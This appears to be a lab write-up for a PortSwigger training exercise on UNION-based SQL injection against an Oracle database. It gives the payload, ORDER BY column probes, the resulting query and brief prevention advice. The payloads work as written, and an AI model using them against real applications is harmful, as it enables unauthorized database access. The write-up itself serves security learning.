SQL Injection: Querying Database Version (Oracle)

Category: SQL Injection
Difficulty: Practitioner
Lab Link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

---

Vulnerability

The product category filter is vulnerable to SQL injection.
User input is directly included in a SQL query, allowing attackers to perform UNION-based SQL injection to retrieve additional data from the database.

The goal of the lab is to retrieve the database version string.

---

Payload

' UNION SELECT banner, NULL FROM v$version--

---

Exploitation Steps

1. Navigate to a product category.
2. Observe the request parameter:

/filter?category=Gifts

3. Determine the number of columns using:

' ORDER BY 1--
' ORDER BY 2--

The query returns 2 columns.

4. Use a UNION-based injection to extract database version information:

' UNION SELECT banner, NULL FROM v$version--

5. The database version string is displayed in the application response, solving the lab.

---

Why the Attack Works

The original query likely resembles:

SELECT name, description FROM products WHERE category='Gifts'

The injected query becomes:

SELECT name, description FROM products WHERE category='Gifts'
UNION SELECT banner, NULL FROM v$version--

Explanation:

- "UNION" merges results from another query.
- "v$version" is an Oracle system table containing database version information.
- "banner" stores the version string.

---

Prevention

- Use parameterized queries
- Avoid concatenating user input into SQL queries
- Implement proper input validation
